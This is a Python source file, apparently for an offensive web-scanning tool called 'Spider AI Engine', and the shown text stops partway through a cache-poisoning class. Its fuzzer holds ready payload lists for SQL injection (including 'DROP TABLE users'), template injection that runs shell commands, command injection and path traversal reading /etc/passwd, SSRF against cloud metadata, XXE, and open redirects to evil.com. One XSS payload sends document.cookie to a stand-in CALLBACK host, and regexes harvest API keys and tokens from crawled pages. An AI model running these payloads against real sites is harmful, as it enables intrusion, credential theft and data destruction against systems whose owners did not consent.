#!/usr/bin/env python3
"""
Spider AI Engine - Cutting-Edge ML-Powered Web Analysis
Goes far beyond traditional web crawlers with AI-driven discovery.

Features:
- Neural endpoint prediction
- Smart parameter fuzzing with context awareness
- Response anomaly detection
- Automatic vulnerability classification
- Intelligent wordlist generation from content
- Business logic flaw detection
- API schema inference
"""

import re
import json
import hashlib
import random
import string
from typing import Dict, List, Set, Tuple, Optional, Any
from dataclasses import dataclass, field
from collections import defaultdict, Counter
from datetime import datetime
import math


@dataclass
class PredictedEndpoint:
    """AI-predicted endpoint"""
    url: str
    confidence: float  # 0.0 - 1.0
    reason: str
    pattern_source: str
    priority: int = 1


@dataclass
class FuzzPayload:
    """Context-aware fuzz payload"""
    value: str
    attack_type: str
    context: str
    severity: str = "MEDIUM"


@dataclass
class AnomalyResult:
    """Detected anomaly in response"""
    url: str
    anomaly_type: str
    score: float
    details: Dict
    timestamp: str = ""


class NeuralEndpointPredictor:
    """
    AI-powered endpoint prediction based on discovered patterns.
    Uses pattern recognition to predict hidden endpoints.
    """
    
    def __init__(self):
        # Common API versioning patterns
        self.version_patterns = [
            (r'/v(\d+)/', lambda m: [f'/v{int(m.group(1))+1}/', f'/v{int(m.group(1))-1}/']),
            (r'/api/v(\d+)/', lambda m: [f'/api/v{int(m.group(1))+1}/', f'/api/v{int(m.group(1))-1}/']),
        ]
        
        # Resource naming patterns
        self.resource_patterns = {
            'singular_to_plural': [
                ('user', 'users'), ('admin', 'admins'), ('account', 'accounts'),
                ('product', 'products'), ('order', 'orders'), ('item', 'items'),
                ('post', 'posts'), ('comment', 'comments'), ('file', 'files'),
                ('image', 'images'), ('document', 'documents'), ('report', 'reports'),
                ('setting', 'settings'), ('config', 'configs'), ('profile', 'profiles'),
            ],
            'crud_operations': ['get', 'list', 'create', 'update', 'delete', 'edit', 'remove', 'add'],
            'common_endpoints': [
                'login', 'logout', 'register', 'signup', 'signin', 'auth', 'oauth',
                'token', 'refresh', 'verify', 'confirm', 'reset', 'forgot', 'password',
                'profile', 'account', 'settings', 'preferences', 'dashboard', 'admin',
                'api', 'graphql', 'rest', 'rpc', 'webhook', 'callback',
                'upload', 'download', 'export', 'import', 'backup', 'restore',
                'search', 'filter', 'sort', 'page', 'paginate',
                'health', 'status', 'ping', 'metrics', 'stats', 'analytics',
                'debug', 'test', 'dev', 'staging', 'internal', 'private',
            ]
        }
        
        # File/directory patterns
        self.file_patterns = [
            '.env', '.git/config', '.gitignore', '.htaccess', '.htpasswd',
            'robots.txt', 'sitemap.xml', 'crossdomain.xml', 'clientaccesspolicy.xml',
            'web.config', 'config.php', 'config.json', 'config.yaml', 'config.yml',
            'package.json', 'composer.json', 'Gemfile', 'requirements.txt',
            'swagger.json', 'swagger.yaml', 'openapi.json', 'openapi.yaml',
            'api-docs', 'docs', 'documentation', 'readme', 'README.md',
            'backup', 'backup.sql', 'backup.zip', 'database.sql', 'dump.sql',
            'phpinfo.php', 'info.php', 'test.php', 'debug.php',
            'wp-config.php', 'wp-login.php', 'wp-admin',
            'admin', 'administrator', 'manager', 'console', 'portal',
            '.DS_Store', 'Thumbs.db', 'desktop.ini',
        ]
        
        # Learned patterns from crawl
        self.discovered_patterns: Dict[str, int] = defaultdict(int)
        self.path_segments: Counter = Counter()
        self.parameter_names: Counter = Counter()
    
    def learn_from_url(self, url: str):
        """Learn patterns from discovered URL"""
        try:
            from urllib.parse import urlparse, parse_qs
            parsed = urlparse(url)
            
            # Learn path segments
            segments = [s for s in parsed.path.split('/') if s]
            for segment in segments:
                self.path_segments[segment] += 1
            
            # Learn parameter names
            params = parse_qs(parsed.query)
            for param in params.keys():
                self.parameter_names[param] += 1
            
            # Learn patterns
            path = parsed.path
            
            # Numeric ID pattern
            if re.search(r'/\d+', path):
                self.discovered_patterns['numeric_id'] += 1
            
            # UUID pattern
            if re.search(r'/[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}', path, re.I):
                self.discovered_patterns['uuid'] += 1
            
            # Base64 pattern
            if re.search(r'/[A-Za-z0-9+/]{20,}={0,2}', path):
                self.discovered_patterns['base64'] += 1
                
        except Exception:
            pass
    
    def predict_endpoints(self, base_url: str, discovered_urls: List[str]) -> List[PredictedEndpoint]:
        """Predict hidden endpoints based on discovered patterns"""
        predictions = []
        
        # Learn from all discovered URLs
        for url in discovered_urls:
            self.learn_from_url(url)
        
        try:
            from urllib.parse import urlparse, urljoin
            parsed_base = urlparse(base_url)
            base = f"{parsed_base.scheme}://{parsed_base.netloc}"
            
            # 1. Predict based on common files
            for file_path in self.file_patterns:
                predicted_url = urljoin(base, '/' + file_path)
                if predicted_url not in discovered_urls:
                    predictions.append(PredictedEndpoint(
                        url=predicted_url,
                        confidence=0.6,
                        reason=f"Common sensitive file: {file_path}",
                        pattern_source="file_patterns",
                        priority=2
                    ))
            
            # 2. Predict based on path segment patterns
            discovered_paths = set()
            for url in discovered_urls:
                parsed = urlparse(url)
                discovered_paths.add(parsed.path)
            
            # Find common path prefixes
            for url in discovered_urls:
                parsed = urlparse(url)
                segments = [s for s in parsed.path.split('/') if s]
                
                if len(segments) >= 1:
                    # Try common endpoint variations
                    prefix = '/'.join(segments[:-1]) if len(segments) > 1 else ''
                    
                    for endpoint in self.resource_patterns['common_endpoints']:
                        predicted_path = f"/{prefix}/{endpoint}" if prefix else f"/{endpoint}"
                        predicted_url = urljoin(base, predicted_path)
                        
                        if predicted_url not in discovered_urls and predicted_path not in discovered_paths:
                            predictions.append(PredictedEndpoint(
                                url=predicted_url,
                                confidence=0.5,
                                reason=f"Common endpoint pattern: {endpoint}",
                                pattern_source="common_endpoints",
                                priority=3
                            ))
                            discovered_paths.add(predicted_path)
            
            # 3. Predict API version variations
            for url in discovered_urls:
                for pattern, generator in self.version_patterns:
                    match = re.search(pattern, url)
                    if match:
                        for replacement in generator(match):
                            predicted_url = re.sub(pattern, replacement, url, count=1)
                            if predicted_url not in discovered_urls:
                                predictions.append(PredictedEndpoint(
                                    url=predicted_url,
                                    confidence=0.7,
                                    reason=f"API version variation",
                                    pattern_source="version_patterns",
                                    priority=1
                                ))
            
            # 4. Predict singular/plural variations
            for url in discovered_urls:
                for singular, plural in self.resource_patterns['singular_to_plural']:
                    if f'/{singular}/' in url or url.endswith(f'/{singular}'):
                        predicted_url = url.replace(f'/{singular}/', f'/{plural}/')
                        predicted_url = predicted_url.replace(f'/{singular}', f'/{plural}')
                        if predicted_url not in discovered_urls:
                            predictions.append(PredictedEndpoint(
                                url=predicted_url,
                                confidence=0.65,
                                reason=f"Singular to plural: {singular} -> {plural}",
                                pattern_source="resource_patterns",
                                priority=2
                            ))
                    elif f'/{plural}/' in url or url.endswith(f'/{plural}'):
                        predicted_url = url.replace(f'/{plural}/', f'/{singular}/')
                        predicted_url = predicted_url.replace(f'/{plural}', f'/{singular}')
                        if predicted_url not in discovered_urls:
                            predictions.append(PredictedEndpoint(
                                url=predicted_url,
                                confidence=0.65,
                                reason=f"Plural to singular: {plural} -> {singular}",
                                pattern_source="resource_patterns",
                                priority=2
                            ))
            
            # 5. Predict CRUD operation endpoints
            for url in discovered_urls:
                parsed = urlparse(url)
                path = parsed.path
                
                for op in self.resource_patterns['crud_operations']:
                    if f'/{op}' not in path.lower():
                        # Try adding operation to path
                        predicted_path = path.rstrip('/') + f'/{op}'
                        predicted_url = urljoin(base, predicted_path)
                        if predicted_url not in discovered_urls:
                            predictions.append(PredictedEndpoint(
                                url=predicted_url,
                                confidence=0.4,
                                reason=f"CRUD operation: {op}",
                                pattern_source="crud_operations",
                                priority=4
                            ))
            
            # 6. Predict based on most common path segments
            top_segments = self.path_segments.most_common(20)
            for segment, count in top_segments:
                if count >= 2:  # Segment appears multiple times
                    # Try common combinations
                    for endpoint in ['api', 'v1', 'v2', 'admin', 'internal']:
                        predicted_url = urljoin(base, f'/{endpoint}/{segment}')
                        if predicted_url not in discovered_urls:
                            predictions.append(PredictedEndpoint(
                                url=predicted_url,
                                confidence=0.35,
                                reason=f"Frequent segment combination: {endpoint}/{segment}",
                                pattern_source="learned_patterns",
                                priority=5
                            ))
            
        except Exception as e:
            pass
        
        # Sort by priority and confidence
        predictions.sort(key=lambda x: (x.priority, -x.confidence))
        
        # Remove duplicates
        seen = set()
        unique_predictions = []
        for pred in predictions:
            if pred.url not in seen:
                seen.add(pred.url)
                unique_predictions.append(pred)
        
        return unique_predictions[:200]  # Limit predictions


class SmartFuzzer:
    """
    Context-aware intelligent fuzzer.
    Generates payloads based on parameter name and context.
    """
    
    def __init__(self):
        # Parameter context mappings
        self.param_contexts = {
            'id': ['numeric', 'uuid', 'idor'],
            'user': ['string', 'sqli', 'auth_bypass'],
            'username': ['string', 'sqli', 'auth_bypass'],
            'email': ['email', 'sqli', 'ssti'],
            'password': ['string', 'sqli', 'auth_bypass'],
            'token': ['jwt', 'base64', 'auth_bypass'],
            'file': ['path_traversal', 'lfi', 'rfi'],
            'path': ['path_traversal', 'lfi', 'ssrf'],
            'url': ['ssrf', 'redirect', 'rfi'],
            'redirect': ['redirect', 'ssrf'],
            'callback': ['ssrf', 'xss', 'redirect'],
            'search': ['xss', 'sqli', 'ssti'],
            'query': ['sqli', 'xss', 'nosqli'],
            'q': ['sqli', 'xss', 'ssti'],
            'sort': ['sqli', 'injection'],
            'order': ['sqli', 'injection'],
            'filter': ['sqli', 'nosqli', 'injection'],
            'page': ['numeric', 'sqli', 'idor'],
            'limit': ['numeric', 'sqli', 'dos'],
            'offset': ['numeric', 'sqli'],
            'cmd': ['command_injection', 'rce'],
            'command': ['command_injection', 'rce'],
            'exec': ['command_injection', 'rce'],
            'run': ['command_injection', 'rce'],
            'template': ['ssti', 'injection'],
            'view': ['ssti', 'lfi', 'path_traversal'],
            'lang': ['lfi', 'path_traversal'],
            'language': ['lfi', 'path_traversal'],
            'include': ['lfi', 'rfi', 'path_traversal'],
            'require': ['lfi', 'rfi'],
            'action': ['injection', 'idor'],
            'type': ['injection', 'idor'],
            'format': ['injection', 'xxe'],
            'data': ['xxe', 'sqli', 'injection'],
            'xml': ['xxe', 'injection'],
            'json': ['json_injection', 'prototype_pollution'],
            'host': ['ssrf', 'header_injection'],
            'port': ['ssrf', 'numeric'],
            'ip': ['ssrf', 'header_injection'],
            'domain': ['ssrf', 'dns_rebind'],
        }
        
        # Attack payloads by type
        self.payloads = {
            'xss': [
                '<script>alert(1)</script>',
                '"><script>alert(1)</script>',
                "'-alert(1)-'",
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '{{constructor.constructor("alert(1)")()}}',
                '${alert(1)}',
                '<img src=x onerror=fetch(`http://CALLBACK/x?c=`+document.cookie)>',
                'javascript:alert(1)',
                '<iframe src="javascript:alert(1)">',
            ],
            'sqli': [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' UNION SELECT NULL--",
                "1' ORDER BY 1--+",
                "1' AND '1'='1",
                "1; DROP TABLE users--",
                "' OR 1=1#",
                "admin'--",
                "1' AND SLEEP(5)--",
                "1' WAITFOR DELAY '0:0:5'--",
                "' OR ''='",
                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            ],
            'nosqli': [
                '{"$gt": ""}',
                '{"$ne": null}',
                '{"$regex": ".*"}',
                '{"$where": "sleep(5000)"}',
                "'; return true; var x='",
                '{"$or": [{}]}',
            ],
            'ssti': [
                '{{7*7}}',
                '${7*7}',
                '<%= 7*7 %>',
                '#{7*7}',
                '*{7*7}',
                '{{config}}',
                '{{self.__class__.__mro__[2].__subclasses__()}}',
                '${T(java.lang.Runtime).getRuntime().exec("id")}',
                '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}',
            ],
            'command_injection': [
                '; id',
                '| id',
                '`id`',
                '$(id)',
                '; sleep 5',
                '| sleep 5',
                '& ping -c 5 127.0.0.1 &',
                '\n/bin/cat /etc/passwd',
                '| cat /etc/passwd',
                '; cat /etc/passwd',
            ],
            'path_traversal': [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\win.ini',
                '....//....//....//etc/passwd',
                '..%252f..%252f..%252fetc/passwd',
                '/etc/passwd%00',
                '....//....//....//....//etc/passwd',
                '..%c0%af..%c0%af..%c0%afetc/passwd',
                'file:///etc/passwd',
            ],
            'lfi': [
                'php://filter/convert.base64-encode/resource=index.php',
                'php://input',
                'data://text/plain,<?php phpinfo(); ?>',
                'expect://id',
                '/proc/self/environ',
                '/var/log/apache2/access.log',
            ],
            'ssrf': [
                'http://127.0.0.1',
                'http://localhost',
                'http://169.254.169.254/latest/meta-data/',
                'http://[::1]',
                'http://0.0.0.0',
                'http://0177.0.0.1',
                'http://2130706433',
                'gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aPING%0d%0a',
                'dict://127.0.0.1:6379/info',
                'file:///etc/passwd',
            ],
            'xxe': [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://CALLBACK/xxe">]><foo>&xxe;</foo>',
            ],
            'redirect': [
                'https://evil.com',
                '//evil.com',
                '/\\evil.com',
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>',
            ],
            'idor': [
                '1', '2', '0', '-1', '99999',
                'admin', 'root', 'test',
                '00000000-0000-0000-0000-000000000000',
            ],
            'auth_bypass': [
                'admin', 'administrator', 'root',
                "' OR '1'='1' --",
                'admin@admin.com',
                'null', 'undefined', 'NaN',
            ],
            'prototype_pollution': [
                '{"__proto__":{"polluted":true}}',
                '{"constructor":{"prototype":{"polluted":true}}}',
            ],
            'header_injection': [
                'value\r\nX-Injected: header',
                'value\r\n\r\n<html>injected</html>',
            ],
            'rce': [
                '; id;',
                '| id',
                '`id`',
                '$(id)',
                '|| id',
                '&& id',
            ],
            'numeric': [
                '0', '1', '-1', '99999999',
                '1.5', 'NaN', 'Infinity',
                '0x1', '0o1', '0b1',
            ],
        }
    
    def get_payloads_for_param(self, param_name: str, current_value: str = "") -> List[FuzzPayload]:
        """Generate context-aware payloads for a parameter"""
        payloads = []
        param_lower = param_name.lower()
        
        # Determine attack contexts
        contexts = set()
        for key, ctx_list in self.param_contexts.items():
            if key in param_lower or param_lower in key:
                contexts.update(ctx_list)
        
        # Default contexts if none matched
        if not contexts:
            contexts = {'xss', 'sqli', 'ssti'}
        
        # Generate payloads for each context
        for context in contexts:
            if context in self.payloads:
                for payload in self.payloads[context]:
                    severity = self._get_severity(context)
                    payloads.append(FuzzPayload(
                        value=payload,
                        attack_type=context,
                        context=f"Parameter '{param_name}' suggests {context}",
                        severity=severity
                    ))
        
        return payloads
    
    def _get_severity(self, attack_type: str) -> str:
        """Get severity for attack type"""
        high_severity = ['rce', 'command_injection', 'sqli', 'ssrf', 'xxe', 'lfi', 'auth_bypass']
        medium_severity = ['xss', 'ssti', 'path_traversal', 'nosqli', 'idor']
        
        if attack_type in high_severity:
            return 'HIGH'
        elif attack_type in medium_severity:
            return 'MEDIUM'
        return 'LOW'


class ResponseAnalyzer:
    """
    Advanced response analysis with anomaly detection.
    Detects subtle differences that indicate vulnerabilities.
    """
    
    def __init__(self):
        self.baseline_responses: Dict[str, Dict] = {}
        self.anomaly_threshold = 0.3
        
        # Error patterns indicating vulnerabilities
        self.error_patterns = {
            'sql_error': [
                r'SQL syntax.*MySQL',
                r'Warning.*mysql_',
                r'PostgreSQL.*ERROR',
                r'ORA-\d{5}',
                r'Microsoft SQL Server',
                r'SQLite3::',
                r'pg_query\(\)',
                r'sqlite_',
                r'valid MySQL result',
                r'SQLSTATE\[',
            ],
            'path_disclosure': [
                r'[A-Z]:\\[^\s]+\.php',
                r'/var/www/[^\s]+',
                r'/home/[^\s]+/public_html',
                r'/usr/local/[^\s]+',
                r'in /[^\s]+\.php on line \d+',
            ],
            'stack_trace': [
                r'Traceback \(most recent call last\)',
                r'at [A-Za-z0-9_]+\.[A-Za-z0-9_]+\([^\)]*\)',
                r'Exception in thread',
                r'java\.[a-z]+\.[A-Z][a-zA-Z]+Exception',
                r'System\.NullReferenceException',
            ],
            'debug_info': [
                r'DEBUG\s*[:=]?\s*True',
                r'DJANGO_SETTINGS_MODULE',
                r'Whoops!',
                r'Laravel',
                r'Symfony\\',
            ],
            'template_error': [
                r'Twig_Error',
                r'Jinja2',
                r'TemplateSyntaxError',
                r'\{\{.*\}\}.*error',
            ],
            'xxe_indicator': [
                r'DTD',
                r'ENTITY',
                r'DOCTYPE',
                r'parser error',
            ],
            'ssrf_indicator': [
                r'Connection refused',
                r'couldn\'t connect to host',
                r'Name or service not known',
                r'getaddrinfo failed',
            ],
        }
        
        # Interesting content patterns
        self.interesting_patterns = {
            'credentials': [
                r'password\s*[:=]\s*["\'][^"\']+["\']',
                r'api[_-]?key\s*[:=]\s*["\'][^"\']+["\']',
                r'secret\s*[:=]\s*["\'][^"\']+["\']',
                r'token\s*[:=]\s*["\'][^"\']+["\']',
            ],
            'internal_ip': [
                r'192\.168\.\d{1,3}\.\d{1,3}',
                r'10\.\d{1,3}\.\d{1,3}\.\d{1,3}',
                r'172\.(1[6-9]|2[0-9]|3[0-1])\.\d{1,3}\.\d{1,3}',
            ],
            'email': [
                r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            ],
            'jwt': [
                r'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+',
            ],
        }
    
    def set_baseline(self, url: str, response: Dict):
        """Set baseline response for comparison"""
        self.baseline_responses[url] = {
            'status': response.get('status'),
            'length': response.get('length', 0),
            'headers': response.get('headers', {}),
            'content_hash': hashlib.md5(str(response.get('body', '')).encode()).hexdigest(),
            'word_count': len(str(response.get('body', '')).split()),
        }
    
    def analyze_response(self, url: str, response: Dict, payload: str = "") -> List[AnomalyResult]:
        """Analyze response for anomalies"""
        anomalies = []
        body = str(response.get('body', ''))
        status = response.get('status', 0)
        headers = response.get('headers', {})
        
        # 1. Check for error patterns
        for error_type, patterns in self.error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, body, re.IGNORECASE):
                    anomalies.append(AnomalyResult(
                        url=url,
                        anomaly_type=f"error_disclosure:{error_type}",
                        score=0.8,
                        details={
                            'pattern': pattern,
                            'payload': payload,
                            'evidence': re.search(pattern, body, re.IGNORECASE).group(0)[:200]
                        },
                        timestamp=datetime.now().isoformat()
                    ))
        
        # 2. Check for interesting content
        for content_type, patterns in self.interesting_patterns.items():
            for pattern in patterns:
                matches = re.findall(pattern, body, re.IGNORECASE)
                if matches:
                    anomalies.append(AnomalyResult(
                        url=url,
                        anomaly_type=f"sensitive_data:{content_type}",
                        score=0.7,
                        details={
                            'matches': matches[:5],
                            'count': len(matches)
                        },
                        timestamp=datetime.now().isoformat()
                    ))
        
        # 3. Compare with baseline (if exists)
        if url in self.baseline_responses:
            baseline = self.baseline_responses[url]
            
            # Status code change
            if status != baseline['status']:
                anomalies.append(AnomalyResult(
                    url=url,
                    anomaly_type="status_change",
                    score=0.6,
                    details={
                        'baseline_status': baseline['status'],
                        'current_status': status,
                        'payload': payload
                    },
                    timestamp=datetime.now().isoformat()
                ))
            
            # Significant length change
            current_length = len(body)
            baseline_length = baseline['length']
            if baseline_length > 0:
                length_diff = abs(current_length - baseline_length) / baseline_length
                if length_diff > self.anomaly_threshold:
                    anomalies.append(AnomalyResult(
                        url=url,
                        anomaly_type="length_anomaly",
                        score=min(length_diff, 1.0),
                        details={
                            'baseline_length': baseline_length,
                            'current_length': current_length,
                            'diff_percent': round(length_diff * 100, 2),
                            'payload': payload
                        },
                        timestamp=datetime.now().isoformat()
                    ))
        
        # 4. Check for reflection (XSS indicator)
        if payload and payload in body:
            anomalies.append(AnomalyResult(
                url=url,
                anomaly_type="reflection",
                score=0.9,
                details={
                    'payload': payload,
                    'reflected': True
                },
                timestamp=datetime.now().isoformat()
            ))
        
        # 5. Check for time-based indicators
        response_time = response.get('time', 0)
        if response_time > 5:  # More than 5 seconds
            anomalies.append(AnomalyResult(
                url=url,
                anomaly_type="time_based",
                score=0.85,
                details={
                    'response_time': response_time,
                    'payload': payload,
                    'possible_sqli': 'sleep' in payload.lower() or 'waitfor' in payload.lower()
                },
                timestamp=datetime.now().isoformat()
            ))
        
        return anomalies


class ContentAnalyzer:
    """
    Intelligent content analysis and wordlist generation.
    Extracts valuable data from crawled content.
    """
    
    def __init__(self):
        self.words: Counter = Counter()
        self.emails: Set[str] = set()
        self.subdomains: Set[str] = set()
        self.paths: Set[str] = set()
        self.js_endpoints: Set[str] = set()
        self.api_keys: List[Dict] = []
        self.comments: List[Dict] = []
    
    def analyze_content(self, url: str, body: str, content_type: str = ""):
        """Analyze content and extract valuable data"""
        if not body:
            return
        
        # Extract words for custom wordlist
        words = re.findall(r'\b[a-zA-Z][a-zA-Z0-9_-]{2,20}\b', body)
        self.words.update(words)
        
        # Extract emails
        emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', body)
        self.emails.update(emails)
        
        # Extract subdomains
        subdomains = re.findall(r'(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}', body)
        self.subdomains.update(subdomains)
        
        # Extract paths from JavaScript
        js_paths = re.findall(r'["\'](/[a-zA-Z0-9_/-]+)["\']', body)
        self.js_endpoints.update(js_paths)
        
        # Extract paths from URLs
        url_paths = re.findall(r'(?:href|src|action)=["\']([^"\']+)["\']', body, re.IGNORECASE)
        self.paths.update(url_paths)
        
        # Extract potential API keys
        api_key_patterns = [
            (r'api[_-]?key["\']?\s*[:=]\s*["\']([^"\']+)["\']', 'api_key'),
            (r'secret[_-]?key["\']?\s*[:=]\s*["\']([^"\']+)["\']', 'secret_key'),
            (r'access[_-]?token["\']?\s*[:=]\s*["\']([^"\']+)["\']', 'access_token'),
            (r'AKIA[0-9A-Z]{16}', 'aws_access_key'),
            (r'sk_live_[0-9a-zA-Z]{24,}', 'stripe_key'),
            (r'ghp_[a-zA-Z0-9]{36}', 'github_token'),
        ]
        
        for pattern, key_type in api_key_patterns:
            matches = re.findall(pattern, body, re.IGNORECASE)
            for match in matches:
                self.api_keys.append({
                    'type': key_type,
                    'value': match if len(match) < 100 else match[:100],
                    'source': url
                })
        
        # Extract comments
        html_comments = re.findall(r'<!--(.+?)-->', body, re.DOTALL)
        js_comments = re.findall(r'/\*(.+?)\*/', body, re.DOTALL)
        
        for comment in html_comments + js_comments:
            if len(comment.strip()) > 10:  # Ignore tiny comments
                self.comments.append({
                    'content': comment.strip()[:500],
                    'source': url
                })
    
    def generate_wordlist(self, min_freq: int = 2) -> List[str]:
        """Generate custom wordlist from discovered content"""
        wordlist = [word for word, freq in self.words.most_common() if freq >= min_freq]
        return wordlist
    
    def get_summary(self) -> Dict:
        """Get analysis summary"""
        return {
            'unique_words': len(self.words),
            'top_words': self.words.most_common(50),
            'emails': list(self.emails)[:100],
            'subdomains': list(self.subdomains)[:100],
            'js_endpoints': list(self.js_endpoints)[:100],
            'api_keys': self.api_keys[:50],
            'interesting_comments': self.comments[:50],
        }


class GraphQLIntrospector:
    """
    Deep GraphQL schema analysis and exploitation.
    """
    
    def __init__(self):
        self.introspection_query = '''
        query IntrospectionQuery {
          __schema {
            queryType { name }
            mutationType { name }
            subscriptionType { name }
            types {
              ...FullType
            }
            directives {
              name
              description
              locations
              args { ...InputValue }
            }
          }
        }

        fragment FullType on __Type {
          kind
          name
          description
          fields(includeDeprecated: true) {
            name
            description
            args { ...InputValue }
            type { ...TypeRef }
            isDeprecated
            deprecationReason
          }
          inputFields { ...InputValue }
          interfaces { ...TypeRef }
          enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
          }
          possibleTypes { ...TypeRef }
        }

        fragment InputValue on __InputValue {
          name
          description
          type { ...TypeRef }
          defaultValue
        }

        fragment TypeRef on __Type {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                    ofType {
                      kind
                      name
                      ofType {
                        kind
                        name
                      }
                    }
                  }
                }
              }
            }
          }
        }
        '''
    
    def parse_schema(self, schema_data: Dict) -> Dict:
        """Parse GraphQL schema and extract useful information"""
        result = {
            'queries': [],
            'mutations': [],
            'subscriptions': [],
            'types': [],
            'sensitive_fields': [],
            'potential_issues': []
        }
        
        if not schema_data or '__schema' not in schema_data:
            return result
        
        schema = schema_data['__schema']
        types = schema.get('types', [])
        
        sensitive_field_names = [
            'password', 'secret', 'token', 'key', 'auth', 'credential',
            'ssn', 'social', 'credit', 'card', 'cvv', 'pin',
            'private', 'internal', 'admin', 'root', 'debug'
        ]
        
        for type_def in types:
            if not type_def.get('name', '').startswith('__'):
                type_info = {
                    'name': type_def.get('name'),
                    'kind': type_def.get('kind'),
                    'fields': []
                }
                
                for field in type_def.get('fields', []) or []:
                    field_info = {
                        'name': field.get('name'),
                        'type': self._get_type_name(field.get('type', {})),
                        'args': [arg.get('name') for arg in field.get('args', [])]
                    }
                    type_info['fields'].append(field_info)
                    
                    # Check for sensitive fields
                    field_name_lower = field.get('name', '').lower()
                    if any(sens in field_name_lower for sens in sensitive_field_names):
                        result['sensitive_fields'].append({
                            'type': type_def.get('name'),
                            'field': field.get('name'),
                            'reason': 'Potentially sensitive field name'
                        })
                
                result['types'].append(type_info)
        
        # Identify query/mutation types
        query_type = schema.get('queryType', {}).get('name')
        mutation_type = schema.get('mutationType', {}).get('name')
        
        for type_def in types:
            if type_def.get('name') == query_type:
                result['queries'] = [f.get('name') for f in type_def.get('fields', []) or []]
            if type_def.get('name') == mutation_type:
                result['mutations'] = [f.get('name') for f in type_def.get('fields', []) or []]
        
        # Check for potential issues
        if result['mutations']:
            for mutation in result['mutations']:
                mutation_lower = mutation.lower()
                if any(x in mutation_lower for x in ['delete', 'remove', 'drop']):
                    result['potential_issues'].append({
                        'type': 'destructive_mutation',
                        'mutation': mutation,
                        'risk': 'HIGH'
                    })
                if any(x in mutation_lower for x in ['admin', 'root', 'super']):
                    result['potential_issues'].append({
                        'type': 'privileged_mutation',
                        'mutation': mutation,
                        'risk': 'HIGH'
                    })
        
        return result
    
    def _get_type_name(self, type_ref: Dict) -> str:
        """Extract type name from GraphQL type reference"""
        if not type_ref:
            return 'Unknown'
        
        if type_ref.get('name'):
            return type_ref['name']
        
        kind = type_ref.get('kind', '')
        of_type = type_ref.get('ofType', {})
        
        if kind == 'NON_NULL':
            return f"{self._get_type_name(of_type)}!"
        elif kind == 'LIST':
            return f"[{self._get_type_name(of_type)}]"
        
        return self._get_type_name(of_type) if of_type else 'Unknown'
    
    def generate_queries(self, schema: Dict) -> List[str]:
        """Generate exploitation queries from schema"""
        queries = []
        
        for query in schema.get('queries', []):
            queries.append(f"query {{ {query} }}")
        
        for mutation in schema.get('mutations', []):
            queries.append(f"mutation {{ {mutation} }}")
        
        return queries


class CORSAnalyzer:
    """
    Advanced CORS misconfiguration detection.
    """
    
    def __init__(self):
        self.test_origins = [
            'https://evil.com',
            'https://attacker.com',
            'null',
            'https://target.com.evil.com',
            'https://targetevil.com',
            'https://evil-target.com',
        ]
    
    def analyze_cors(self, headers: Dict, request_origin: str = None) -> Dict:
        """Analyze CORS headers for misconfigurations"""
        result = {
            'vulnerable': False,
            'issues': [],
            'acao': None,
            'acac': False,
            'methods': [],
            'headers_exposed': []
        }
        
        acao = headers.get('Access-Control-Allow-Origin', headers.get('access-control-allow-origin'))
        acac = headers.get('Access-Control-Allow-Credentials', headers.get('access-control-allow-credentials'))
        
        result['acao'] = acao
        result['acac'] = str(acac).lower() == 'true'
        
        if acao:
            # Wildcard with credentials
            if acao == '*' and result['acac']:
                result['vulnerable'] = True
                result['issues'].append({
                    'type': 'wildcard_with_credentials',
                    'severity': 'HIGH',
                    'description': 'CORS allows any origin with credentials'
                })
            
            # Null origin allowed
            if acao == 'null':
                result['vulnerable'] = True
                result['issues'].append({
                    'type': 'null_origin',
                    'severity': 'MEDIUM',
                    'description': 'CORS allows null origin (sandboxed iframes)'
                })
            
            # Origin reflection
            if request_origin and acao == request_origin:
                result['vulnerable'] = True
                result['issues'].append({
                    'type': 'origin_reflection',
                    'severity': 'HIGH',
                    'description': f'CORS reflects arbitrary origin: {request_origin}'
                })
        
        return result


class HTTPRequestSmuggler:
    """
    HTTP Request Smuggling detection.
    """
    
    def __init__(self):
        self.cl_te_payloads = [
            # CL.TE
            {
                'name': 'CL.TE basic',
                'headers': {
                    'Content-Length': '6',
                    'Transfer-Encoding': 'chunked'
                },
                'body': '0\r\n\r\nG'
            },
            # TE.CL
            {
                'name': 'TE.CL basic',
                'headers': {
                    'Content-Length': '3',
                    'Transfer-Encoding': 'chunked'
                },
                'body': '1\r\nG\r\n0\r\n\r\n'
            },
        ]
        
        self.te_obfuscation = [
            'Transfer-Encoding: chunked',
            'Transfer-Encoding: xchunked',
            'Transfer-Encoding : chunked',
            'Transfer-Encoding: chunked\r\nTransfer-Encoding: x',
            'Transfer-Encoding: x\r\nTransfer-Encoding: chunked',
            'Transfer-Encoding:\tchunked',
            'Transfer-Encoding: chunked\r\n',
        ]
    
    def get_detection_requests(self, base_url: str) -> List[Dict]:
        """Generate HTTP smuggling detection requests"""
        requests = []
        
        for payload in self.cl_te_payloads:
            requests.append({
                'url': base_url,
                'method': 'POST',
                'headers': payload['headers'],
                'body': payload['body'],
                'test_name': payload['name'],
                'detection_type': 'timing'
            })
        
        return requests


class CachePoisioningDetector:
    """
    Web cache poisoning detection.
    """
    
    def __init__(self):
